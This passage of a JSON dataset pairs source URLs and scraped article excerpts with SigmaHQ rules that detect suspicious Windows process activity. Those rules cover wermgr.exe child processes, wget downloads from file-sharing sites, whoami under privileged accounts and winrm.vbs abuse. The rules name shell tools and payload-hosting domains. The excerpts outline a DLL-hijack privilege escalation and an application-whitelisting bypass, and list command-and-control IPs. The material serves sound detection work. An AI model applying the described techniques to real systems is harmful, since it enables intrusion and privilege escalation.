            "\\cscript.exe",
            "\\ipconfig.exe",
            "\\mshta.exe",
            "\\net.exe",
            "\\net1.exe",
            "\\netstat.exe",
            "\\nslookup.exe",
            "\\powershell_ise.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\systeminfo.exe",
            "\\whoami.exe",
            "\\wscript.exe"
          ]
        },
        "filter_main_rundll32": {
          "Image|endswith": "\\rundll32.exe",
          "CommandLine|contains|all": [
            "C:\\Windows\\system32\\WerConCpl.dll",
            "LaunchErcApp "
          ],
          "CommandLine|contains": [
            "-queuereporting",
            "-responsepester"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wermgr_susp_child_process.yml"
  },
  "646": {
    "url": "https://www.echotrail.io/insights/search/wermgr.exe",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Child Process Of Wermgr.EXE",
      "id": "396f6630-f3ac-44e3-bfc8-1b161bc00c4e",
      "related": [
        {
          "id": "5394fcc7-aeb2-43b5-9a09-cac9fc5edcd5",
          "type": "similar"
        }
      ],
      "status": "experimental",
      "description": "Detects suspicious Windows Error Reporting manager (wermgr.exe) child process",
      "references": [
        "https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html",
        "https://www.echotrail.io/insights/search/wermgr.exe",
        "https://github.com/binderlabs/DirCreate2System"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-10-14",
      "modified": "2024-08-29",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1055",
        "attack.t1036"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\wermgr.exe",
          "Image|endswith": [
            "\\cmd.exe",
            "\\cscript.exe",
            "\\ipconfig.exe",
            "\\mshta.exe",
            "\\net.exe",
            "\\net1.exe",
            "\\netstat.exe",
            "\\nslookup.exe",
            "\\powershell_ise.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\systeminfo.exe",
            "\\whoami.exe",
            "\\wscript.exe"
          ]
        },
        "filter_main_rundll32": {
          "Image|endswith": "\\rundll32.exe",
          "CommandLine|contains|all": [
            "C:\\Windows\\system32\\WerConCpl.dll",
            "LaunchErcApp "
          ],
          "CommandLine|contains": [
            "-queuereporting",
            "-responsepester"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wermgr_susp_child_process.yml"
  },
  "647": {
    "url": "https://github.com/binderlabs/DirCreate2System",
    "markdown": "# DirCreate2System Weaponizing to get NT AUTHORITY\\SYSTEM for Privileged Directory Creation Bugs with Windows Error Reporting ### Short Description: I've discovered **comctl32.dll** (which is missing in system dir which doesn't really exist) has been loaded by wermgr.exe via windows error reporting by running schtasks. It means if we can create a folder name as **C:\\windows\\system32\\wermgr.exe.local** with Full permission ACL, we can hijack the **comctl32.dll** in that folders. Then, I created this poc as a Directory creation to NT AUTHORITY\\SYSTEM shell method. ### **POC video** POC.wmv (with backblaze's directory creation bug) #### Remark: I've already reported to backblaze and they replied",
    "sigma_rule": {
      "title": "Suspicious Child Process Of Wermgr.EXE",
      "id": "396f6630-f3ac-44e3-bfc8-1b161bc00c4e",
      "related": [
        {
          "id": "5394fcc7-aeb2-43b5-9a09-cac9fc5edcd5",
          "type": "similar"
        }
      ],
      "status": "experimental",
      "description": "Detects suspicious Windows Error Reporting manager (wermgr.exe) child process",
      "references": [
        "https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html",
        "https://www.echotrail.io/insights/search/wermgr.exe",
        "https://github.com/binderlabs/DirCreate2System"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-10-14",
      "modified": "2024-08-29",
      "tags": [
        "attack.defense-evasion",
        "attack.privilege-escalation",
        "attack.t1055",
        "attack.t1036"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\wermgr.exe",
          "Image|endswith": [
            "\\cmd.exe",
            "\\cscript.exe",
            "\\ipconfig.exe",
            "\\mshta.exe",
            "\\net.exe",
            "\\net1.exe",
            "\\netstat.exe",
            "\\nslookup.exe",
            "\\powershell_ise.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\rundll32.exe",
            "\\systeminfo.exe",
            "\\whoami.exe",
            "\\wscript.exe"
          ]
        },
        "filter_main_rundll32": {
          "Image|endswith": "\\rundll32.exe",
          "CommandLine|contains|all": [
            "C:\\Windows\\system32\\WerConCpl.dll",
            "LaunchErcApp "
          ],
          "CommandLine|contains": [
            "-queuereporting",
            "-responsepester"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wermgr_susp_child_process.yml"
  },
  "648": {
    "url": "https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Execution Location Of Wermgr.EXE",
      "id": "5394fcc7-aeb2-43b5-9a09-cac9fc5edcd5",
      "related": [
        {
          "id": "396f6630-f3ac-44e3-bfc8-1b161bc00c4e",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious Windows Error Reporting manager (wermgr.exe) execution location.",
      "references": [
        "https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html",
        "https://www.echotrail.io/insights/search/wermgr.exe",
        "https://github.com/binderlabs/DirCreate2System"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-10-14",
      "modified": "2023-08-23",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\wermgr.exe"
        },
        "filter_main_legit_location": {
          "Image|startswith": [
            "C:\\Windows\\System32\\",
            "C:\\Windows\\SysWOW64\\",
            "C:\\Windows\\WinSxS\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wermgr_susp_exec_location.yml"
  },
  "649": {
    "url": "https://www.echotrail.io/insights/search/wermgr.exe",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Execution Location Of Wermgr.EXE",
      "id": "5394fcc7-aeb2-43b5-9a09-cac9fc5edcd5",
      "related": [
        {
          "id": "396f6630-f3ac-44e3-bfc8-1b161bc00c4e",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious Windows Error Reporting manager (wermgr.exe) execution location.",
      "references": [
        "https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html",
        "https://www.echotrail.io/insights/search/wermgr.exe",
        "https://github.com/binderlabs/DirCreate2System"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-10-14",
      "modified": "2023-08-23",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\wermgr.exe"
        },
        "filter_main_legit_location": {
          "Image|startswith": [
            "C:\\Windows\\System32\\",
            "C:\\Windows\\SysWOW64\\",
            "C:\\Windows\\WinSxS\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wermgr_susp_exec_location.yml"
  },
  "650": {
    "url": "https://github.com/binderlabs/DirCreate2System",
    "markdown": "# DirCreate2System Weaponizing to get NT AUTHORITY\\SYSTEM for Privileged Directory Creation Bugs with Windows Error Reporting ### Short Description: I've discovered **comctl32.dll** (which is missing in system dir which doesn't really exist) has been loaded by wermgr.exe via windows error reporting by running schtasks. It means if we can create a folder name as **C:\\windows\\system32\\wermgr.exe.local** with Full permission ACL, we can hijack the **comctl32.dll** in that folders. Then, I created this poc as a Directory creation to NT AUTHORITY\\SYSTEM shell method. ### **POC video** POC.wmv (with backblaze's directory creation bug) #### Remark: I've already reported to backblaze and they replied",
    "sigma_rule": {
      "title": "Suspicious Execution Location Of Wermgr.EXE",
      "id": "5394fcc7-aeb2-43b5-9a09-cac9fc5edcd5",
      "related": [
        {
          "id": "396f6630-f3ac-44e3-bfc8-1b161bc00c4e",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious Windows Error Reporting manager (wermgr.exe) execution location.",
      "references": [
        "https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html",
        "https://www.echotrail.io/insights/search/wermgr.exe",
        "https://github.com/binderlabs/DirCreate2System"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-10-14",
      "modified": "2023-08-23",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\wermgr.exe"
        },
        "filter_main_legit_location": {
          "Image|startswith": [
            "C:\\Windows\\System32\\",
            "C:\\Windows\\SysWOW64\\",
            "C:\\Windows\\WinSxS\\"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wermgr_susp_exec_location.yml"
  },
  "651": {
    "url": "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
    "markdown": "# FIN7 tradecraft seen in attacks against Veeam backup servers 26 April 2023 ## Updates: 28-04-2023 1100 UTC - We have reviewed and updated this blogpost to reflect our latest findings: - We have added information regarding the file “445.ps1”, which was missing at the time of writing. - We have updated this blogpost to broaden our attribution from FIN7 to FIN7 or a threat actor utilizing FIN7 tradecraft. ## Introduction WithSecure Intelligence identified attacks which occurred in late March 2023 against internet-facing servers running Veeam Backup & Replication software. Our research indicates that the intrusion set used in these",
    "sigma_rule": {
      "title": "Suspicious File Download From File Sharing Domain Via Wget.EXE",
      "id": "a0d7e4d2-bede-4141-8896-bc6e237e977c",
      "status": "experimental",
      "description": "Detects potentially suspicious file downloads from file sharing domains using wget.exe",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
        "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
        "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-05",
      "modified": "2024-10-21",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\wget.exe"
          },
          {
            "OriginalFileName": "wget.exe"
          }
        ],
        "selection_websites": {
          "CommandLine|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "pixeldrain.com",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "selection_http": {
          "CommandLine|contains": "http"
        },
        "selection_flag": [
          {
            "CommandLine|re": "\\s-O\\s"
          },
          {
            "CommandLine|contains": "--output-document"
          }
        ],
        "selection_ext": {
          "CommandLine|endswith": [
            ".ps1",
            ".ps1'",
            ".ps1\"",
            ".dat",
            ".dat'",
            ".dat\"",
            ".msi",
            ".msi'",
            ".msi\"",
            ".bat",
            ".bat'",
            ".bat\"",
            ".exe",
            ".exe'",
            ".exe\"",
            ".vbs",
            ".vbs'",
            ".vbs\"",
            ".vbe",
            ".vbe'",
            ".vbe\"",
            ".hta",
            ".hta'",
            ".hta\"",
            ".dll",
            ".dll'",
            ".dll\"",
            ".psm1",
            ".psm1'",
            ".psm1\""
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wget_download_susp_file_sharing_domains.yml"
  },
  "652": {
    "url": "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
    "markdown": "# FIN7VEEAM Indicators of Compromise (IOCs) | Indicator type | Value | Note | | -------------- | ----- | ---- | | SHA1 | 8687b6b1508a93556d6e30d14e5c4ee9971f2d80 | POWERTRASH \"icsnd16_64refl.ps1\" sample | | SHA1 | b621f8c5e9033718b4e9d47a2f0eccb9783f612a | DUBLOADER \"libcurl.dll\" sample | | SHA1 | e5480a47172e3f75dbf0384f4ca82c7b47910e0f | POWERTRASH \"icbt11801_64refl.ps1\" sample | | IP | 217.12.206.176 | DICELOADER C2 | | IP | 162.248.225.115 | DICELOADER C2 | | IP | 45.136.199.128 | DICELOADER C2 | | IP | 91.149.243.181 | DICELOADER C2 | | IP | 91.199.147.152 | DICELOADER C2 | | IP | 95.217.49.123 | DICELOADER C2 | | IP | 77.75.230.112",
    "sigma_rule": {
      "title": "Suspicious File Download From File Sharing Domain Via Wget.EXE",
      "id": "a0d7e4d2-bede-4141-8896-bc6e237e977c",
      "status": "experimental",
      "description": "Detects potentially suspicious file downloads from file sharing domains using wget.exe",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
        "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
        "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-05",
      "modified": "2024-10-21",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\wget.exe"
          },
          {
            "OriginalFileName": "wget.exe"
          }
        ],
        "selection_websites": {
          "CommandLine|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "pixeldrain.com",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "selection_http": {
          "CommandLine|contains": "http"
        },
        "selection_flag": [
          {
            "CommandLine|re": "\\s-O\\s"
          },
          {
            "CommandLine|contains": "--output-document"
          }
        ],
        "selection_ext": {
          "CommandLine|endswith": [
            ".ps1",
            ".ps1'",
            ".ps1\"",
            ".dat",
            ".dat'",
            ".dat\"",
            ".msi",
            ".msi'",
            ".msi\"",
            ".bat",
            ".bat'",
            ".bat\"",
            ".exe",
            ".exe'",
            ".exe\"",
            ".vbs",
            ".vbs'",
            ".vbs\"",
            ".vbe",
            ".vbe'",
            ".vbe\"",
            ".hta",
            ".hta'",
            ".hta\"",
            ".dll",
            ".dll'",
            ".dll\"",
            ".psm1",
            ".psm1'",
            ".psm1\""
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wget_download_susp_file_sharing_domains.yml"
  },
  "653": {
    "url": "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/",
    "markdown": "# New TTPs observed in Mint Sandstorm campaign targeting high-profile individuals at universities and research orgs **Published on January 17, 2024** --- Since November 2023, Microsoft has observed a distinct subset of Mint Sandstorm (PHOSPHORUS) targeting high-profile individuals working on Middle Eastern affairs at universities and research organizations in Belgium, France, Gaza, Israel, the United Kingdom, and the United States. In this campaign, Mint Sandstorm used bespoke phishing lures in an attempt to socially engineer targets into downloading malicious files. In a handful of cases, Microsoft observed new post-intrusion tradecraft including the use of a new, custom backdoor called MediaPl.",
    "sigma_rule": {
      "title": "Suspicious File Download From File Sharing Domain Via Wget.EXE",
      "id": "a0d7e4d2-bede-4141-8896-bc6e237e977c",
      "status": "experimental",
      "description": "Detects potentially suspicious file downloads from file sharing domains using wget.exe",
      "references": [
        "https://labs.withsecure.com/publications/fin7-target-veeam-servers",
        "https://github.com/WithSecureLabs/iocs/blob/344203de742bb7e68bd56618f66d34be95a9f9fc/FIN7VEEAM/iocs.csv",
        "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-05",
      "modified": "2024-10-21",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\wget.exe"
          },
          {
            "OriginalFileName": "wget.exe"
          }
        ],
        "selection_websites": {
          "CommandLine|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "pixeldrain.com",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "selection_http": {
          "CommandLine|contains": "http"
        },
        "selection_flag": [
          {
            "CommandLine|re": "\\s-O\\s"
          },
          {
            "CommandLine|contains": "--output-document"
          }
        ],
        "selection_ext": {
          "CommandLine|endswith": [
            ".ps1",
            ".ps1'",
            ".ps1\"",
            ".dat",
            ".dat'",
            ".dat\"",
            ".msi",
            ".msi'",
            ".msi\"",
            ".bat",
            ".bat'",
            ".bat\"",
            ".exe",
            ".exe'",
            ".exe\"",
            ".vbs",
            ".vbs'",
            ".vbs\"",
            ".vbe",
            ".vbe'",
            ".vbe\"",
            ".hta",
            ".hta'",
            ".hta\"",
            ".dll",
            ".dll'",
            ".dll\"",
            ".psm1",
            ".psm1'",
            ".psm1\""
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wget_download_susp_file_sharing_domains.yml"
  },
  "654": {
    "url": "https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment",
    "markdown": "",
    "sigma_rule": {
      "title": "Whoami.EXE Execution From Privileged Process",
      "id": "79ce34ca-af29-4d0e-b832-fc1b377020db",
      "related": [
        {
          "id": "80167ada-7a12-41ed-b8e9-aa47195c66a1",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the execution of \"whoami.exe\" by privileged accounts that are often abused by threat actors",
      "references": [
        "https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment",
        "https://web.archive.org/web/20221019044836/https://nsudo.m2team.org/en-us/"
      ],
      "author": "Florian Roth (Nextron Systems), Teymur Kheirkhabarov",
      "date": "2022-01-28",
      "modified": "2023-12-04",
      "tags": [
        "attack.privilege-escalation",
        "attack.discovery",
        "attack.t1033"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "whoami.exe"
          },
          {
            "Image|endswith": "\\whoami.exe"
          }
        ],
        "selection_user": {
          "User|contains": [
            "AUTHORI",
            "AUTORI",
            "TrustedInstaller"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_whoami_execution_from_high_priv_process.yml"
  },
  "655": {
    "url": "https://web.archive.org/web/20221019044836/https://nsudo.m2team.org/en-us/",
    "markdown": "# NSudo | System Administration Toolkit ## About ### Prototype NSudo Launcher is based on SuperCMD by Raymai97. Visit here for more information about SuperCMD. NSudo Devil Mode is based on the Dism++ God Mode, with new features and several improvements. ### Features - Distributed under the MIT License. - Provide the x86, x86-64, ARM64 binaries. - Support Windows Vista and later. - Using VC-LTL and libkcrt from Chuyu Team for smaller binary size. - Using C++17, but only use core language features in the most cases. - NSudo Launcher - Launch programs with TrustedInstaller access token. - Launch programs",
    "sigma_rule": {
      "title": "Whoami.EXE Execution From Privileged Process",
      "id": "79ce34ca-af29-4d0e-b832-fc1b377020db",
      "related": [
        {
          "id": "80167ada-7a12-41ed-b8e9-aa47195c66a1",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects the execution of \"whoami.exe\" by privileged accounts that are often abused by threat actors",
      "references": [
        "https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment",
        "https://web.archive.org/web/20221019044836/https://nsudo.m2team.org/en-us/"
      ],
      "author": "Florian Roth (Nextron Systems), Teymur Kheirkhabarov",
      "date": "2022-01-28",
      "modified": "2023-12-04",
      "tags": [
        "attack.privilege-escalation",
        "attack.discovery",
        "attack.t1033"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "whoami.exe"
          },
          {
            "Image|endswith": "\\whoami.exe"
          }
        ],
        "selection_user": {
          "User|contains": [
            "AUTHORI",
            "AUTORI",
            "TrustedInstaller"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_whoami_execution_from_high_priv_process.yml"
  },
  "656": {
    "url": "https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404",
    "markdown": "# Application Whitelisting Bypass and Arbitrary Unsigned Code Execution Technique in winrm.vbs **Jul 12, 2018** ## Bypass Technique Description winrm.vbs (a Windows-signed script in System32) is able to consume and execute attacker-controlled XSL which is not subject to enlightened script host restrictions, resulting in the execution of arbitrary, unsigned code execution. When you supply “-format:pretty” or “-format:text” to winrm.vbs, it pulls WsmPty.xsl or WsmTxt.xsl respectively from the directory in which cscript.exe resides. This means that if an attacker copies cscript.exe to an attacker-controlled location where their malicious XSL resides, they will achieve arbitrary unsigned code execution. This issue is effectively",
    "sigma_rule": {
      "title": "AWL Bypass with Winrm.vbs and Malicious WsmPty.xsl/WsmTxt.xsl",
      "id": "074e0ded-6ced-4ebd-8b4d-53f55908119d",
      "status": "test",
      "description": "Detects execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via winrm.vbs and copied cscript.exe (can be renamed)",
      "references": [
        "https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404"
      ],
      "author": "Julia Fomina, oscd.community",
      "date": "2020-10-06",
      "modified": "2022-10-09",
      "tags": [
        "attack.defense-evasion",
        "attack.t1216"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "contains_format_pretty_arg": {
          "CommandLine|contains": [
            "format:pretty",
            "format:\"pretty\"",
            "format:\"text\"",
            "format:text"
          ]
        },
        "image_from_system_folder": {
          "Image|startswith": [
            "C:\\Windows\\System32\\",
            "C:\\Windows\\SysWOW64\\"
          ]
        },
        "contains_winrm": {
          "CommandLine|contains": "winrm"
        },
        "condition": "contains_winrm and (contains_format_pretty_arg and not image_from_system_folder)"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_winrm_awl_bypass.yml"
  },
  "657": {
    "url": "https://twitter.com/bohops/status/994405551751815170",
    "markdown": "",
    "sigma_rule": {
      "title": "Remote Code Execute via Winrm.vbs",
      "id": "9df0dd3a-1a5c-47e3-a2bc-30ed177646a0",
      "status": "test",
      "description": "Detects an attempt to execute code or create service on remote host via winrm.vbs.",
      "references": [
        "https://twitter.com/bohops/status/994405551751815170",
        "https://redcanary.com/blog/lateral-movement-winrm-wmi/",
        "https://lolbas-project.github.io/lolbas/Scripts/Winrm/"
      ],
      "author": "Julia Fomina, oscd.community",
      "date": "2020-10-07",
      "modified": "2023-03-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1216"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cscript.exe"
          },
          {
            "OriginalFileName": "cscript.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "winrm",
            "invoke Create wmicimv2/Win32_",
            "-r:http"
          ]
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml"
  },
  "658": {
    "url": "https://redcanary.com/blog/lateral-movement-winrm-wmi/",
    "markdown": "",
    "sigma_rule": {
      "title": "Remote Code Execute via Winrm.vbs",
      "id": "9df0dd3a-1a5c-47e3-a2bc-30ed177646a0",
      "status": "test",
      "description": "Detects an attempt to execute code or create service on remote host via winrm.vbs.",
      "references": [
        "https://twitter.com/bohops/status/994405551751815170",
        "https://redcanary.com/blog/lateral-movement-winrm-wmi/",
        "https://lolbas-project.github.io/lolbas/Scripts/Winrm/"
      ],
      "author": "Julia Fomina, oscd.community",
      "date": "2020-10-07",
      "modified": "2023-03-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1216"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cscript.exe"
          },
          {
            "OriginalFileName": "cscript.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "winrm",
            "invoke Create wmicimv2/Win32_",
            "-r:http"
          ]
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml"
  },
  "659": {
    "url": "https://lolbas-project.github.io/lolbas/Scripts/Winrm/",
    "markdown": "",
    "sigma_rule": {
      "title": "Remote Code Execute via Winrm.vbs",
      "id": "9df0dd3a-1a5c-47e3-a2bc-30ed177646a0",
      "status": "test",
      "description": "Detects an attempt to execute code or create service on remote host via winrm.vbs.",
      "references": [
        "https://twitter.com/bohops/status/994405551751815170",
        "https://redcanary.com/blog/lateral-movement-winrm-wmi/",
        "https://lolbas-project.github.io/lolbas/Scripts/Winrm/"
      ],
      "author": "Julia Fomina, oscd.community",
      "date": "2020-10-07",
      "modified": "2023-03-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1216"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\cscript.exe"
          },
          {
            "OriginalFileName": "cscript.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "winrm",
            "invoke Create wmicimv2/Win32_",
            "-r:http"
          ]
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs.yml"
  },
  "660": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/5c1e6f1b4fafd01c8d1ece85f510160fc1275fbf/atomics/T1562.001/T1562.001.md",
    "markdown": "",
    "sigma_rule": {
      "title": "Potential Windows Defender Tampering Via Wmic.EXE",
